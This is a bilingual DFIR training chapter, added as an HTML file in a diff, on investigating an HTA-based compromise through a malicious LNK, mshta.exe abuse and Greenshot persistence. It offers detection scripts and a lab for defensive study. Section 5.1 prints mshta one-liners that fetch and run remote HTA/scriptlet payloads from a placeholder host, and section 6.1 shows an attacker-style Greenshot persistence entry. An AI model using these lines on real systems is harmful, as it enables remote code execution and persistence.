@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cap. 19 — HTA Compromise | Ch. 19</title>
+<style>
+:root{--bg:#0d1117;--bg2:#161b22;--bg3:#1c2128;--fg:#c9d1d9;--fg2:#8b949e;--accent:#39d353;--accent2:#58a6ff;--warn:#d29922;--danger:#f85149;--border:#30363d;--code-bg:#0b0f14;--code-fg:#7ee787}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--fg);font-family:"Segoe UI",Roboto,Helvetica,Arial,sans-serif;line-height:1.65;font-size:16px}
+header{background:linear-gradient(135deg,#0d1117 0%,#161b22 100%);border-bottom:2px solid var(--accent2);padding:2rem 1.5rem 1.5rem}
+header h1{margin:0 0 .3rem;font-size:1.9rem;color:var(--accent2)}
+header .sub{color:var(--fg2);font-size:.95rem}
+header .meta{margin-top:.8rem;font-size:.85rem;color:var(--fg2)}
+header .meta span{margin-right:1.2rem}
+nav.toc{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1rem 1.2rem;margin:1.5rem auto;max-width:1100px}
+nav.toc h2{margin:0 0 .6rem;font-size:1rem;color:var(--accent2);text-transform:uppercase;letter-spacing:.05em}
+nav.toc ol{margin:0;padding-left:1.3rem;columns:2;column-gap:2rem}
+nav.toc a{color:var(--fg);text-decoration:none}
+nav.toc a:hover{color:var(--accent2)}
+main{max-width:1100px;margin:0 auto;padding:0 1.5rem 3rem}
+section{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1.4rem 1.6rem;margin:1.5rem 0}
+section h2{margin-top:0;color:var(--accent2);font-size:1.3rem;border-bottom:1px solid var(--border);padding-bottom:.5rem}
+section h3{color:var(--accent);font-size:1.05rem;margin-top:1.4rem}
+.lang{display:block;margin:.4rem 0}
+.lang .pt::before{content:"🇵🇹 PT ";color:var(--accent);font-weight:600;font-size:.8rem}
+.lang .en::before{content:"🇬🇧 EN ";color:var(--accent2);font-weight:600;font-size:.8rem}
+.lang .pt,.lang .en{display:block;margin:.25rem 0}
+pre{background:var(--code-bg);border:1px solid var(--border);border-left:3px solid var(--accent);border-radius:6px;padding:1rem 1.1rem;overflow-x:auto;font-family:"Cascadia Code","Fira Code",Consolas,monospace;font-size:.88rem;color:var(--code-fg);line-height:1.5}
+code.inline{background:var(--bg3);border:1px solid var(--border);border-radius:4px;padding:.1rem .4rem;font-family:Consolas,monospace;font-size:.88rem;color:var(--accent)}
+table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:.92rem}
+th,td{border:1px solid var(--border);padding:.55rem .7rem;text-align:left;vertical-align:top}
+th{background:var(--bg3);color:var(--accent2)}
+tr:nth-child(even) td{background:rgba(255,255,255,.02)}
+.callout{border-left:4px solid var(--warn);background:rgba(210,153,34,.08);padding:.8rem 1rem;border-radius:0 6px 6px 0;margin:1rem 0}
+.callout.danger{border-left-color:var(--danger);background:rgba(248,81,73,.08)}
+.callout.info{border-left-color:var(--accent2);background:rgba(88,166,255,.08)}
+.callout strong{color:var(--fg)}
+.badge{display:inline-block;font-size:.7rem;font-weight:700;letter-spacing:.05em;padding:.15rem .5rem;border-radius:999px;margin-left:.4rem;vertical-align:middle}
+.badge.orig{background:rgba(88,166,255,.15);color:var(--accent2);border:1px solid var(--accent2)}
+.badge.comp{background:rgba(57,211,83,.12);color:var(--accent);border:1px solid var(--accent)}
+.badge.impact{background:rgba(248,81,73,.12);color:var(--danger);border:1px solid var(--danger)}
+ul.checklist{list-style:none;padding-left:0}
+ul.checklist li::before{content:"☐ ";color:var(--accent);font-weight:700;margin-right:.3rem}
+footer{border-top:1px solid var(--border);margin-top:3rem;padding:1.5rem;text-align:center;color:var(--fg2);font-size:.85rem}
+footer a{color:var(--accent2);text-decoration:none}
+@media (max-width:720px){nav.toc ol{columns:1}header h1{font-size:1.4rem}}
+</style>
+</head>
+<body>
+<header>
+<h1>Cap. 19 — HTA Compromise</h1>
+<div class="sub">Ch. 19 — Tracing an HTA-Based Compromise</div>
+<div class="meta"><span>📖 Manual de Formação Ethical Hacker</span><span>🛡️ Nível: DFIR / Avançado</span></div>
+</header>
+<nav class="toc">
+<h2>Índice / Table of Contents</h2>
+<ol>
+<li><a href="#obj">Objetivos</a></li><li><a href="#ctx">Contexto</a></li>
+<li><a href="#wpndb">Windows Notification DB</a></li><li><a href="#lnk">Análise do LNK</a></li>
+<li><a href="#hta">Mshta e T1218.005</a></li><li><a href="#lolapps">LOLAPPS Persistence</a></li>
+<li><a href="#impact">Scripts de Impacto</a></li><li><a href="#mitre">MITRE</a></li>
+<li><a href="#mitig">Mitigações</a></li><li><a href="#lab">Laboratório</a></li>
+<li><a href="#revq">Revisão</a></li><li><a href="#sum">Resumo</a></li>
+</ol>
+</nav>
+<main>
+
+<section id="obj">
+<h2>1. Objetivos de Aprendizagem / Learning Objectives</h2>
+<div class="lang">
+<span class="pt">Compreender o vetor de ataque baseado em HTA (mshta.exe); analisar a base de dados <code class="inline">wpndatabase.db</code> para reconstruir a linha temporal; usar o <strong>LECmd</strong> para extrair o comando de um ficheiro <code class="inline">.lnk</code>; identificar persistência via <strong>LOLAPPS</strong> (Greenshot); detetar execução de <code class="inline">mshta.exe</code> com URLs remotas; <strong>construir scripts de impacto nativos</strong> para deteção.</span>
+<span class="en">Understand HTA-based attack vector (mshta.exe); analyze the <code class="inline">wpndatabase.db</code> to reconstruct the timeline; use <strong>LECmd</strong> to extract the command from a <code class="inline">.lnk</code> file; identify <strong>LOLAPPS</strong> persistence (Greenshot); detect <code class="inline">mshta.exe</code> execution with remote URLs; <strong>build native impact scripts</strong> for detection.</span>
+</div>
+</section>
+
+<section id="ctx">
+<h2>2. Contexto e Relevância / Context and Relevance <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">Os ficheiros HTA (HTML Application) correm com "full trust" por omissão, fora do sandbox do browser, e podem executar comandos arbitrários com os privilégios do utilizador que os lançou. Isto torna-os atrativos para atacantes que querem um único ficheiro que execute código. No caso do artigo, um freelancer entregou uma amostra de trabalho com um template; o cliente abriu o template e a máquina foi infetada por um stager HTA em segundo plano. O <code class="inline">templet.lnk</code> é o objeto perigoso — não o documento em si.</span>
+<span class="en">HTA (HTML Application) files run with "full trust" by default, outside browser sandboxing, and can execute arbitrary commands with the privileges of the user who launched them. This makes them attractive to attackers who want a single file that executes code. In the article's case, a freelancer delivered a work sample with a template; the customer opened the template and the machine was infected by an HTA stager in the background. The <code class="inline">templet.lnk</code> is the dangerous object — not the document itself.</span>
+</div>
+</section>
+
+<section id="wpndb">
+<h2>3. Windows Notification Database <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">Um dos primeiros locais que deu resultados foi a base de dados <code class="inline">wpndatabase.db</code>, em <code class="inline">C:\Users\USERNAME\AppData\Local\Microsoft\Windows\Notifications</code>. Esta base SQLite armazena notificações toast e web do Windows. O Chrome e outros browsers podem mostrar notificações de sites através do Action Center, e essas notificações ficam registadas nesta base. Na investigação, abrimos a base em DB Browser for SQLite e examinámos a tabela <code class="inline">Notification</code>. Encontrámos uma entrada que correspondia à hora em que a vítima reportou ter recebido uma mensagem com o template e uma password para o arquivo.</span>
+<span class="en">One of the first places that paid off was the database <code class="inline">wpndatabase.db</code>, at <code class="inline">C:\Users\USERNAME\AppData\Local\Microsoft\Windows\Notifications</code>. This SQLite database stores Windows toast and web notifications. Chrome and other browsers can surface site notifications through the Action Center, and those notifications are recorded in this database. In the investigation, we opened the database in DB Browser for SQLite and examined the <code class="inline">Notification</code> table. We found an entry that matched the time when the victim reported receiving a message with the template and a password for the archive.</span>
+</div>
+<pre># Abrir a base de dados SQLite
+# Usar DB Browser for SQLite ou:
+PS > sqlite3 "$env:LOCALAPPDATA\Microsoft\Windows\Notifications\wpndatabase.db"
+sqlite> SELECT * FROM Notification ORDER BY ArrivalTime DESC LIMIT 20;</pre>
+</section>
+
+<section id="lnk">
+<h2>4. Análise do Ficheiro LNK <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">Uma pesquisa simples no diretório Downloads da vítima revelou dois itens: um documento benigno que correspondia à amostra prometida pelo freelancer, e um ficheiro <code class="inline">templet.lnk</code>. Os ficheiros LNK são um favorito de atacantes e autores de phishing. Atalhos podem chamar programas com argumentos arbitrários, e quando colocados em servidores de ficheiros partilhados ou em bundles de download podem ser usados para enganar as pessoas a lançar código.</span>
+<span class="en">A simple search of the victim's Downloads directory turned up two items: a benign looking document that matched the freelancer's promised sample, and a <code class="inline">templet.lnk</code> file. LNK files are a long time favorite of attackers and phishing authors. Shortcuts can call programs with arbitrary arguments, and when placed on shared file servers or in download bundles they can be used to trick people into launching code.</span>
+</div>
+<h3>4.1 LECmd — Extração do comando / Command extraction</h3>
+<pre>PS > LECmd.exe -f .\templet.lnk</pre>
+<div class="lang">
+<span class="pt">O LECmd extrai o binário alvo, os argumentos de linha de comando, o diretório de trabalho e outros metadados do atalho. No caso do artigo, revelou um one-liner PowerShell fortemente ofuscado. Após desofuscação, o script contacta um servidor C2, força TLS 1.2, descarrega <code class="inline">se1.hta</code>, escreve-o em disco, executa-o, espera 3 segundos e apaga-o.</span>
+<span class="en">LECmd extracts the target binary, command-line arguments, working directory, and other metadata from the shortcut. In the article's case, it revealed a heavily obfuscated PowerShell one-liner. After deobfuscation, the script contacts a C2 server, enforces TLS 1.2, downloads <code class="inline">se1.hta</code>, writes it to disk, executes it, waits 3 seconds, and deletes it.</span>
+</div>
+</section>
+
+<section id="hta">
+<h2>5. Mshta e T1218.005 <span class="badge orig">Original</span> <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt">O <code class="inline">mshta.exe</code> é uma utilidade do Windows que executa ficheiros Microsoft HTML Application (HTA). Os atacantes abusam dele para execução de código malicioso, contornando soluções de controlo de aplicações que não preveem o seu uso. Como o <code class="inline">mshta.exe</code> executa fora do contexto de segurança do Internet Explorer, também contorna as definições de segurança do browser . A técnica está mapeada como <strong>T1218.005 — System Binary Proxy Execution: Mshta</strong> .</span>
+<span class="en"><code class="inline">mshta.exe</code> is a Windows utility that executes Microsoft HTML Application (HTA) files. Adversaries abuse it for malicious code execution, bypassing application control solutions that don't account for its potential use. Since <code class="inline">mshta.exe</code> executes outside of Internet Explorer's security context, it also bypasses browser security settings . The technique is mapped as <strong>T1218.005 — System Binary Proxy Execution: Mshta</strong> .</span>
+</div>
+<h3>5.1 Padrões de execução / Execution patterns</h3>
+<pre># HTA remoto via URL
+mshta http://webserver/payload.hta
+
+# Inline VBScript
+mshta vbscript:Close(Execute("GetObject(""script:https://webserver/payload.sct"")"))</pre>
+<h3>5.2 Deteção MITRE / MITRE detection </h3>
+<div class="lang">
+<span class="pt">A estratégia de deteção do MITRE (DET0506) procura <code class="inline">mshta.exe</code> com argumentos que referenciam conteúdo HTA/script remoto ou local, seguido de criação de ficheiros, obtenção de rede, ou spawn de processos que indiquem execução de payload fora do contexto do Internet Explorer. A correlação inclui linhagem de processo pai, inspeção de linha de comando, e criação de conexão de rede para endpoints não confiáveis .</span>
+<span class="en">MITRE's detection strategy (DET0506) looks for <code class="inline">mshta.exe</code> with arguments referencing remote or local HTA/script content, followed by file creation, network retrieval, or process spawning that indicates payload execution outside Internet Explorer's security context. Correlation includes parent process lineage, command-line inspection, and network connection creation to untrusted endpoints .</span>
+</div>
+</section>
+
+<section id="lolapps">
+<h2>6. LOLAPPS Persistence (Greenshot) <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">O projeto LOLAPPS cataloga formas de adversários explorarem aplicações legítimas para persistência, movimento lateral, exfiltração e mais. Exemplos incluem o Greenshot, Visual Studio Code, entre outros, onde funcionalidades podem ser sequestradas ou reaproveitadas. No caso do artigo, entre as aplicações instaladas estava o <strong>Greenshot</strong>, uma utilidade legítima de captura de ecrã. O problema é que o Greenshot inclui um plugin <strong>External Command</strong> que permite configurar uma linha de comando arbitrária para pós-processamento.</span>
+<span class="en">The LOLAPPS project catalogs ways adversaries can exploit legitimate applications for persistence, lateral movement, data exfiltration, and more. Examples include Greenshot, Visual Studio Code, and others where features can be hijacked or repurposed. In the article's case, among the installed applications was <strong>Greenshot</strong>, a legitimate open-source screenshot utility. The problem is that Greenshot includes an <strong>External Command</strong> plugin that allows a user to configure an arbitrary command line for post-processing.</span>
+</div>
+<h3>6.1 Configuração / Configuration</h3>
+<pre># Ficheiro de configuração do Greenshot
+C:\Users\USERNAME\AppData\Roaming\Greenshot\Greenshot.ini
+
+# Entrada modificada pelo atacante (exemplo)
+[ExternalCommand]
+Command=\AppData\Local\Temp\templet.lnk</pre>
+<div class="lang">
+<span class="pt">A cadeia de execução fica clara: quando o Greenshot inicia, executa o comando configurado, que aponta para <code class="inline">templet.lnk</code> no diretório Temp. Isto dá ao atacante persistência sem criar um serviço ou scheduled task — usando uma aplicação legítima que o utilizador já tem instalada.</span>
+<span class="en">The execution chain becomes clear: when Greenshot starts, it runs the configured command, which points to <code class="inline">templet.lnk</code> in the Temp directory. This gives the attacker persistence without creating a service or scheduled task — using a legitimate application the user already has installed.</span>
+</div>
+</section>
+
+<section id="impact">
+<h2>7. Scripts de Impacto / Impact Scripts <span class="badge impact">Impacto</span> <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt">Os scripts abaixo ajudam o blue team a detetar as técnicas deste capítulo.</span>
+<span class="en">The scripts below help the blue team detect the techniques in this chapter.</span>
+</div>
+
+<h3>7.1 Script 19.1 — Deteção de Mshta com URL / Mshta with URL Detection</h3>
+<div class="lang">
+<span class="pt"><strong>Objetivo:</strong> detetar <code class="inline">mshta.exe</code> com <code class="inline">http://</code>, <code class="inline">https://</code> ou <code class="inline">ftp://</code> na linha de comando (evento 4688). <strong>Evidência:</strong> <code class="inline">mshta-url-detect.csv</code>.</span>
+<span class="en"><strong>Goal:</strong> detect <code class="inline">mshta.exe</code> with <code class="inline">http://</code>, <code class="inline">https://</code>, or <code class="inline">ftp://</code> in the command line (event 4688). <strong>Evidence:</strong> <code class="inline">mshta-url-detect.csv</code>.</span>
+</div>
+<pre># Script 19.1 - Mshta with URL Detection
+$out = ".\mshta-url-detect.csv"
+$hits = @()
+Get-WinEvent -LogName Security -MaxEvents 3000 -EA SilentlyContinue |
+  Where-Object { $_.Id -eq 4688 } | ForEach-Object {
+    $xml = [xml]$_.ToXml()
+    $proc = ($xml.Event.EventData.Data | Where-Object Name -eq "NewProcessName").'#text'
+    $cmd  = ($xml.Event.EventData.Data | Where-Object Name -eq "CommandLine").'#text'
+    if ($proc -match "mshta\.exe" -and $cmd -match "(https?|ftp)://") {
+      $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Process=$proc; Command=$cmd }
+    }
+  }
+$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
+Write-Host "[+] Mshta URL hits: $($hits.Count) -> $out" -ForegroundColor Red</pre>
+
+<h3>7.2 Script 19.2 — Deteção de Persistência Greenshot / Greenshot Persistence Detection</h3>
+<div class="lang">
+<span class="pt"><strong>Objetivo:</strong> verificar se o <code class="inline">Greenshot.ini</code> tem o plugin External Command configurado com um caminho suspeito. <strong>Evidência:</strong> <code class="inline">greenshot-persist.csv</code>.</span>
+<span class="en"><strong>Goal:</strong> check if <code class="inline">Greenshot.ini</code> has the External Command plugin configured with a suspicious path. <strong>Evidence:</strong> <code class="inline">greenshot-persist.csv</code>.</span>
+</div>
+<pre># Script 19.2 - Greenshot Persistence Detection
+$out = ".\greenshot-persist.csv"
+$hits = @()
+$iniPaths = @(
+  "$env:APPDATA\Greenshot\Greenshot.ini",
+  "C:\Users\*\AppData\Roaming\Greenshot\Greenshot.ini"
+)
+foreach ($p in $iniPaths) {
+  Get-Item $p -EA SilentlyContinue | ForEach-Object {
+    $content = Get-Content $_.FullName -Raw
+    if ($content -match "ExternalCommand" -or $content -match "Command=.*Temp") {
+      $hits += [PSCustomObject]@{ Path=$_.FullName; LastWrite=$_.LastWriteTime; Suspicious=$true }
+    }
+  }
+}
+$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
+Write-Host "[+] Greenshot persistence: $($hits.Count) -> $out" -ForegroundColor Red</pre>
+
+<h3>7.3 Script 19.3 — Análise de LNK com PowerShell / LNK Analysis with PowerShell</h3>
+<div class="lang">
+<span class="pt"><strong>Objetivo:</strong> extrair o comando de um ficheiro <code class="inline">.lnk</code> sem depender do LECmd (usando COM <code class="inline">WScript.Shell</code>). <strong>Evidência:</strong> <code class="inline">lnk-commands.csv</code>.</span>
+<span class="en"><strong>Goal:</strong> extract the command from a <code class="inline">.lnk</code> file without depending on LECmd (using COM <code class="inline">WScript.Shell</code>). <strong>Evidence:</strong> <code class="inline">lnk-commands.csv</code>.</span>
+</div>
+<pre># Script 19.3 - LNK Command Extractor
+param([string]$LnkPath)
+$out = ".\lnk-commands.csv"
+$ws = New-Object -ComObject WScript.Shell
+$hits = @()
+Get-ChildItem $LnkPath -Filter "*.lnk" -Recurse -EA SilentlyContinue | ForEach-Object {
+  try {
+    $lnk = $ws.CreateShortcut($_.FullName)
+    $hits += [PSCustomObject]@{
+      LnkFile = $_.FullName
+      TargetPath = $lnk.TargetPath
+      Arguments = $lnk.Arguments
+      WorkingDirectory = $lnk.WorkingDirectory
+    }
+  } catch {}
+}
+$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
+Write-Host "[+] LNK files analyzed: $($hits.Count) -> $out" -ForegroundColor Yellow
+$hits | Format-Table -AutoSize</pre>
+</section>
+
+<section id="mitre">
+<h2>8. Mapeamento MITRE ATT&amp;CK <span class="badge comp">Complementar</span></h2>
+<table>
+<tr><th>Técnica</th><th>ID</th><th>Onde</th></tr>
+<tr><td>System Binary Proxy Execution: Mshta</td><td>T1218.005</td><td>Mshta, HTA </td></tr>
+<tr><td>User Execution: Malicious File</td><td>T1204.002</td><td><code class="inline">templet.lnk</code></td></tr>
+<tr><td>Event Triggered Execution</td><td>T1546</td><td>Greenshot LOLAPPS</td></tr>
+<tr><td>Command and Scripting Interpreter: PowerShell</td><td>T1059.001</td><td>Stager PowerShell</td></tr>
+<tr><td>Ingress Tool Transfer</td><td>T1105</td><td>Download de <code class="inline">se1.hta</code></td></tr>
+</table>
+</section>
+
+<section id="mitig">
+<h2>9. Mitigações Blue Team / Mitigations <span class="badge comp">Complementar</span></h2>
+<ol>
+<li><strong>Monitorizar mshta.exe com URLs</strong> (evento 4688, Sysmon 1) — Script 19.1.</li>
+<li><strong>Detetar persistência via Greenshot</strong> (e outros LOLAPPS) — Script 19.2.</li>
+<li><strong>Analisar LNK suspeitos</strong> com LECmd ou Script 19.3.</li>
+<li><strong>Desativar mshta.exe</strong> via AppLocker/WDAC se não for necessário.</li>
+<li><strong>Auditar plugins de aplicações legítimas</strong> (Greenshot External Command, VS Code tasks).</li>
+<li><strong>Monitorizar wpndatabase.db</strong> para notificações suspeitas (timeline).</li>
+<li><strong>Honeytokens</strong> — ficheiros LNK falsos, configs de Greenshot com iscas.</li>
+</ol>
+</section>
+
+<section id="lab">
+<h2>10. Exercício de Laboratório / Lab Exercise <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt"><strong>Cenário:</strong> VM Windows isolada com snapshot. Criar um ficheiro <code class="inline">templet.lnk</code> simulado que executa <code class="inline">mshta.exe</code> com URL de teste, e configurar o Greenshot (se instalado) com External Command. Correr os scripts de deteção. <strong>Objetivo:</strong> reconstruir a cadeia e validar deteções.</span>
+<span class="en"><strong>Scenario:</strong> Isolated Windows VM with snapshot. Create a simulated <code class="inline">templet.lnk</code> that runs <code class="inline">mshta.exe</code> with a test URL, and configure Greenshot (if installed) with External Command. Run detection scripts. <strong>Goal:</strong> reconstruct the chain and validate detections.</span>
+</div>
+<table>
+<tr><th>#</th><th>Tarefa</th><th>Comando</th><th>Evidência</th></tr>
+<tr><td>1</td><td>Criar LNK simulado</td><td><code class="inline">$ws.CreateShortcut(...)</code> com TargetPath = mshta.exe e Arguments = URL</td><td>Ficheiro <code class="inline">.lnk</code></td></tr>
+<tr><td>2</td><td>Analisar LNK</td><td><code class="inline">.\lnk-analyzer.ps1 -LnkPath .\Downloads</code></td><td><code class="inline">lnk-commands.csv</code></td></tr>
+<tr><td>3</td><td>Deteção mshta</td><td><code class="inline">.\mshta-url-detect.ps1</code></td><td><code class="inline">mshta-url-detect.csv</code></td></tr>
+<tr><td>4</td><td>Configurar Greenshot</td><td>Editar <code class="inline">Greenshot.ini</code> com External Command</td><td>Ficheiro modificado</td></tr>
+<tr><td>5</td><td>Deteção Greenshot</td><td><code class="inline">.\greenshot-persist.ps1</code></td><td><code class="inline">greenshot-persist.csv</code></td></tr>
+<tr><td>6</td><td>Analisar wpndatabase</td><td><code class="inline">sqlite3 wpndatabase.db "SELECT * FROM Notification"</code></td><td>Timeline</td></tr>
+</table>
+<h3>Checklist de evidências / Evidence checklist</h3>
+<ul class="checklist">
+<li>Snapshot inicial</li>
+<li>Ficheiro <code class="inline">.lnk</code> criado</li>
+<li><code class="inline">lnk-commands.csv</code></li>
+<li><code class="inline">mshta-url-detect.csv</code></li>
+<li><code class="inline">greenshot-persist.csv</code></li>
+<li>Output da wpndatabase</li>
+<li>Snapshot final</li>
+</ul>
+</section>
+
+<section id="revq">
+<h2>11. Perguntas de Revisão / Review Questions <span class="badge comp">Complementar</span></h2>
+<ol>
+<li>Porque é que os ficheiros HTA são perigosos? / Why are HTA files dangerous?</li>
+<li>O que é a base <code class="inline">wpndatabase.db</code> e para que serve na investigação? / What is <code class="inline">wpndatabase.db</code> and what is it used for in the investigation?</li>
+<li>O que faz o LECmd? / What does LECmd do?</li>
+<li>O que é o T1218.005? / What is T1218.005? </li>
+<li>Como é que o Greenshot foi usado para persistência? / How was Greenshot used for persistence?</li>
+<li>Como se deteta mshta.exe com URL? / How to detect mshta.exe with URL?</li>
+<li>Porque é que os LOLAPPS são difíceis de detetar? / Why are LOLAPPS hard to detect?</li>
+</ol>
+</section>
+
+<section id="sum">
+<h2>12. Resumo do Capítulo / Chapter Summary</h2>
+<div class="lang">
+<span class="pt">Este capítulo cobriu a investigação de um compromisso baseado em HTA: a base <code class="inline">wpndatabase.db</code> para timeline, o ficheiro <code class="inline">templet.lnk</code> como stager (analisado com LECmd), o one-liner PowerShell ofuscado que descarrega <code class="inline">se1.hta</code> e o executa via <code class="inline">mshta.exe</code> (T1218.005), e a persistência via <strong>Greenshot</strong> (LOLAPPS) com o plugin External Command. Acrescentámos <strong>três scripts de impacto</strong> (deteção de mshta com URL, persistência Greenshot, análise de LNK) que ajudam o blue team a detetar esta cadeia. O Cap. 20 entra na evasão de AV/EDR com DeadMatter.</span>
+<span class="en">This chapter covered the investigation of an HTA-based compromise: the <code class="inline">wpndatabase.db</code> for timeline, the <code class="inline">templet.lnk</code> as stager (analyzed with LECmd), the obfuscated PowerShell one-liner that downloads <code class="inline">se1.hta</code> and executes it via <code class="inline">mshta.exe</code> (T1218.005), and persistence via <strong>Greenshot</strong> (LOLAPPS) with the External Command plugin. We added <strong>three impact scripts</strong> (mshta URL detection, Greenshot persistence, LNK analysis) that help the blue team detect this chain. Ch. 20 moves into AV/EDR evasion with DeadMatter.</span>
+</div>
+</section>
+
+</main>
+<footer>
+<div>Manual de Formação Ethical Hacker — Cap. 19 / Ethical Hacker Training Manual — Ch. 19</div>
+<div style="margin-top:.6rem">
+<a href="cap18.html">← Cap. anterior / Previous</a> &nbsp;|&nbsp;
+<a href="#">Índice / Index</a> &nbsp;|&nbsp;
+<a href="cap20.html">Cap. seguinte / Next →</a>
+</div>
+</footer>
+</body>
+</html>
